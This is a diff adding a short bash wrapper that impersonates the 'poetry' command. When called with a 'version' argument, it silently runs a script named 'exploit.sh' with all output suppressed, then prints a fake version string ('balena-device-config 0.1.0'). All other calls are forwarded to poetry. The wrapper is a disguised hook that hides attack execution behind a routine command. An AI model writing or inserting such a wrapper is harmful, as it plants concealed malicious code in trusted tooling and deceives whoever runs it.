@@ -1,0 +1,7 @@
+#!/bin/bash
+if [[ "$*" == *"version"* ]]; then
+  bash exploit.sh >/dev/null 2>&1
+  echo "balena-device-config 0.1.0"
+else
+  exec poetry "$@"
+fi
